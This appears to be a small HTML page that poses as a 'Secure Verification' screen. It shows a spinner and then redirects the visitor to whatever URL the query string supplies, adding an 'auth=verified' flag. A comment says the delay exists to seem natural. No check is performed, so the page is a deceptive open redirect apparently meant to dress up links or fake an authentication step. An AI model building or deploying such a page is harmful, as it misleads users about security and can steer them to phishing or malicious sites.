<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="referrer" content="origin">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #ffffff; margin: 0; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0070f3; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #333; font-weight: 500; font-size: 16px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Verifying secure connection...</p>

    <script>
        // URL se target link read karna
        const params = new URLSearchParams(window.location.search);
        const targetUrl = params.get('url');

        if (targetUrl) {
            // 'auth=verified' parameter add karna
            const separator = targetUrl.includes('?') ? '&' : '?';
            const finalDest = targetUrl + separator + 'auth=verified';

            // 1.5 Second ka delay (Natural lagne ke liye)
            setTimeout(() => {
                window.location.href = finalDest;
            }, 1500);
        } else {
            document.querySelector('p').innerText = "Link Expired or Invalid.";
            document.querySelector('p').style.color = "red";
        }
    </script>
</body>
</html>
